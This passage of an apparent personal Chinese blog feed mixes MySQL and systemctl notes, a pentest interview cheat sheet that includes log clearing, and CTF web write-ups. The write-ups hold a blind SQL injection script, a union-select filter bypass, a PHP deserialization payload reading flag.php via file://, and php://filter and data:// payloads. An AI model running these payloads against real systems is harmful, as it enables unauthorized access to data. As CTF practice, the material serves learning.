mysqld<br><br><span class="hljs-meta"># 关闭开机启动</span><br>systemctl disable mysqld<br><br><span class="hljs-meta"># 启动服务</span><br>systemctl start mysqld<br><br><span class="hljs-meta"># 停止服务</span><br>systemctl stop mysqld<br><br><span class="hljs-meta"># 重启服务</span><br>systemctl restart mysqld<br><br><span class="hljs-meta"># 查看服务状态</span><br>systemctl status mysqld<br>systemctl is-active sshd.service<br><br><span class="hljs-meta"># 结束服务进程(服务无法停止时)</span><br>systemctl kill mysqld<br><br></code></pre></div></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>如果想让Apache识别默认的index.php文件，需要修改配置文件 /etc/httpd/conf/httpd.conf 中，在如下位置加入 index.php </p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透面经-1</title>
    <link href="/2021/04/29/%E4%BF%A1%E5%AE%89/%E9%9D%A2%E7%BB%8F/%E6%B8%97%E9%80%8F%E9%9D%A2%E7%BB%8F-1/"/>
    <url>/2021/04/29/%E4%BF%A1%E5%AE%89/%E9%9D%A2%E7%BB%8F/%E6%B8%97%E9%80%8F%E9%9D%A2%E7%BB%8F-1/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透面经-1"><a href="#渗透面经-1" class="headerlink" title="渗透面经-1"></a>渗透面经-1</h1><h2 id="漏洞top10"><a href="#漏洞top10" class="headerlink" title="漏洞top10"></a>漏洞top10</h2><ol><li>SQL注入</li><li>失效的身份与会话认证</li><li>跨站脚本攻击XSS</li><li>引用不安全的对象</li><li>安全配置错误</li><li>敏感信息泄露</li><li>缺少功能级的访问控制</li><li>跨站请求伪造CSRF</li><li>使用含有漏洞的组件</li><li>未验证的重定向和转发</li></ol><h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><p>一.信息收集</p><ol><li>获取域名的whois信息如注册者姓名邮箱电话等</li><li>查看是否有CDN，进行多地ping或nslookup命令查询</li><li>通过域名查询，子域名，旁站，C段等</li><li>查询相关信息如ssl证书，app，微信公众号，DNS信息等等</li><li>对目标域名爆破，利用如潮汐等工具识别网站的指纹找到对应的cms，中间件等</li><li>收集敏感信息，利用fofa查看是否有敏感信息，github源码等</li></ol><p>二.漏洞扫描</p><ol><li>用AVWS、AppScan、OWASP-ZAP、Nessus扫描web漏洞，查看cms和中间件是否有相关的漏洞爆出</li><li>利用相关的漏洞进行上传获取webshell权限</li></ol><p>三.内网渗透</p><ol><li>查看目录可能获取部分信息</li><li>利用提权工具进行提权</li><li>清除日志</li></ol><p>四.总结报告与修复方案</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><strong>类型</strong></p><ul><li>布尔盲注</li><li>时间盲注（延时注入）</li><li>报错注入</li><li>宽字节注入</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ol><li>反射型</li><li>存储型</li><li>DOM型</li></ol>]]></content>
    
    
    <categories>
      
      <category>信安 面经</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>面经</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql基本</title>
    <link href="/2021/04/20/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E5%9F%BA%E6%9C%AC/"/>
    <url>/2021/04/20/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E5%9F%BA%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="基本创建"><a href="#基本创建" class="headerlink" title="基本创建"></a>基本创建</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">/*创建*/</span><br><span class="hljs-keyword">create</span> database 数据库名;<br><span class="hljs-comment">/*删除*/</span><br><span class="hljs-keyword">drop</span> database 库名;<br></code></pre></div></td></tr></table></figure><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">/*创建*/</span><br><span class="hljs-keyword">create</span> if <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> table_name(<br>   runoob_id <span class="hljs-type">int</span> UNSIGNED AUTO_INCREMENT,<span class="hljs-comment">/*自动增加一*/</span><br>   runoob_title <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>   runoob_author <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">40</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,<br>   submission_date <span class="hljs-type">DATE</span>,<br>   <span class="hljs-keyword">PRIMARY</span> KEY ( runoob_id )<br>)ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;<br><span class="hljs-comment">/*删除*/</span><br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">TABLE</span> table_name ;<br></code></pre></div></td></tr></table></figure><h2 id="增删查改"><a href="#增删查改" class="headerlink" title="增删查改"></a>增删查改</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">/*增加*/</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name ( field1, field2,...fieldN ) <span class="hljs-keyword">values</span> ( value1, value2,...valueN );<br><span class="hljs-comment">/*删除*/</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> table_name [<span class="hljs-keyword">WHERE</span> Clause]<br><span class="hljs-comment">/*查询*/</span><br><span class="hljs-keyword">select</span> column_name,column_name <span class="hljs-keyword">FROM</span> table_name [<span class="hljs-keyword">WHERE</span> Clause] [LIMIT N][ <span class="hljs-keyword">OFFSET</span> M]<br><span class="hljs-comment">/*更改*/</span><br>update table_name <span class="hljs-keyword">set</span> field1<span class="hljs-operator">=</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span>value1, field2<span class="hljs-operator">=</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span>value2 [<span class="hljs-keyword">WHERE</span> Clause]<br></code></pre></div></td></tr></table></figure><h2 id="查询具体创建命令"><a href="#查询具体创建命令" class="headerlink" title="查询具体创建命令"></a>查询具体创建命令</h2><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">/* 查看信息而已 */</span><br><span class="hljs-keyword">desc</span> <span class="hljs-keyword">table</span>;<br><span class="hljs-comment">/* 具体创建语句 */</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> database test_d;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> table1;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql修改用户密码</title>
    <link href="/2021/04/20/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/"/>
    <url>/2021/04/20/%E6%95%B0%E6%8D%AE%E5%BA%93/mysql%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h1 id="mysql修改用户密码的方法"><a href="#mysql修改用户密码的方法" class="headerlink" title="mysql修改用户密码的方法"></a>mysql修改用户密码的方法</h1><p>运行—&gt;输入 cmd 回车<br>登陆：mysql -u root  -p1234<br>格式：mysqladmin -u用户名 -p旧密码 password 新密码<br>例子：mysqladmin -uroot -p123456 password 123<br>退出：mysql&gt; quit</p><p>create user ‘user‘@’%’ identified by ‘password’;</p><p>使用通配符’%’是无论在哪都可以进行连接的，也可以换成固定的IP地址<br> grant all on *.* to ‘user‘@’%’ identified by ‘password’;</p><p>给刚才创建的用户授权，all是所有权限。*.<em>，前一个</em>是数据库名，后一个是表名</p><h1 id="查看用户"><a href="#查看用户" class="headerlink" title="查看用户"></a>查看用户</h1><p>use mysql</p><p>select * from user;</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2019 华北赛区 Day2 Web1_Hack World 1</title>
    <link href="/2021/04/20/%E4%BF%A1%E5%AE%89/CTF/Web/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World%201/"/>
    <url>/2021/04/20/%E4%BF%A1%E5%AE%89/CTF/Web/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World%201/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World 1"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</h1><p>进入网站之后发现输入框，且已有flag的提示信息，应当为sql注入</p><p>尝试输入1，1‘，1’ or 1=1发现部分被过滤</p><p>利用1=()=1及bp进行查看具体过滤信息</p><p><img src="https://img-blog.csdnimg.cn/20191212220618572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTY3Mzk4,size_16,color_FFFFFF,t_70"></p><p>其中482的为被过滤的部分</p><p>因为回显固定所以应当使用盲注</p><p>发现or被过滤了但是ascii没有被过滤所以尝试通过ascii进行盲注</p><p>构建payload</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-operator">=</span>(ascii(substr((<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(flag)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span>ascii(<span class="hljs-string">&#x27;f&#x27;</span>))<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>构建相关脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tmp</span>(<span class="hljs-params">url,sql</span>):</span><br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d次&quot;</span>%(i))<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:<br>            data=&#123;<br>                <span class="hljs-string">&#x27;id&#x27;</span>:sql%(i,<span class="hljs-built_in">ord</span>(j))<br>            &#125;<br>            r=requests.post(url=url,data=data)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;Hello, glzjin wants a girlfriend.&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                flag+=j<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:%s&quot;</span>%(flag))<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>目录穿越</title>
    <link href="/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"/>
    <url>/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h1><p>原理Nginx错误配置产生穿越漏洞</p><p>  Nginx错误配置可能产生目录穿越漏洞，比如：</p><div class="hljs code-wrapper"><pre><code>location /static &#123;    alias /home/myapp/static/;&#125;</code></pre></div><p>  由于static后没有加/，如果用户请求/static…/，拼接到alias进会变成/home/myapp/static/…/会穿越到myapp目录</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网站敏感文件</title>
    <link href="/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%BD%91%E7%AB%99%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/"/>
    <url>/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/%E7%BD%91%E7%AB%99%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="常用的网站敏感文件"><a href="#常用的网站敏感文件" class="headerlink" title="常用的网站敏感文件"></a>常用的网站敏感文件</h1><p>敏感文件主要有：<br> 1.gedit备份文件，格式为filename，比如index.php~<br> 2.vim备份文件，格式为.filename.swp或者*.swo或者*.swn，比 如 .index.php.swp<br> 3.robots.txt</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF 相关知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯 2018_Fakebook 1</title>
    <link href="/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%201/"/>
    <url>/2021/04/19/%E4%BF%A1%E5%AE%89/CTF/Web/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook%201/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2018-Fakebook-1"><a href="#网鼎杯-2018-Fakebook-1" class="headerlink" title="[网鼎杯 2018]Fakebook 1"></a>[网鼎杯 2018]Fakebook 1</h1><p>进入界面后首先查看源代码及网络</p><p>之后进行注册 再登录后发现sql注入，进行注入后发现屏蔽了union select用union/**/select 进行绕过</p><p>最后得到O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:11;s:4:”blog”;s:5:”1.com”;}</p><p>再访问robots.txt</p><p>得到部分源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = curl_init();<br><br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        curl_close(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>阅读源码发现blog可以进行查看构建对应/var/www/html/flag.php的反序列进行查看最后如下</p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">no</span>=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union/**/select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,%<span class="hljs-number">27</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">123</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;%<span class="hljs-number">27</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ZJCTF 2019_NiZhuanSiWei</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BZJCTF%202019%5DNiZhuanSiWei%20/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BZJCTF%202019%5DNiZhuanSiWei%20/</url>
    
    <content type="html"><![CDATA[<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ol><li><p>data伪协议写入文件</p></li><li><p>php://</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">php:<span class="hljs-comment">//filter用于读取源码</span><br>php:<span class="hljs-comment">//input用于执行php代码</span><br></code></pre></div></td></tr></table></figure></li><li><p>反序列化</p></li></ol><p>这里需要我们传入一个文件且其内容为welcome to the  zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">text=data:<span class="hljs-comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></code></pre></div></td></tr></table></figure><p>可以进入界面尝试读取文件userless.php 利用php://filter</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=useless.php<br></code></pre></div></td></tr></table></figure><p>读取后可以得到如下代码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Flag;<br><span class="hljs-variable">$a</span>-&gt;file=flag.php;<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>构造对应的反序列得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>最终的payload为</p><p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p>查看源代码即可得到flag</p>]]></content>
    
    
    <categories>
      
      <category>信安 CTF Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
      <tag>序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020_Easy MD5 1</title>
    <link href="/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BBJDCTF2020%5DEasy%20MD5%201/"/>
    <url>/2021/04/18/%E4%BF%A1%E5%AE%89/CTF/Web/%5BBJDCTF2020%5DEasy%20MD5%201/</url>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="进入界面后查看源码"><a href="#进入界面后查看源码" class="headerlink" title="进入界面后查看源码"></a>进入界面后查看源码</h2><p>有效的代码如下</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /header end --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;leveldo4.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;password&#x27;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;in&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;give&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-comment">&lt;!-- /main end --&gt;</span><br></code></pre></div></td></tr></table></figure><p>尝试输入并查看网络部分</p><p>发现回来的有提示</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 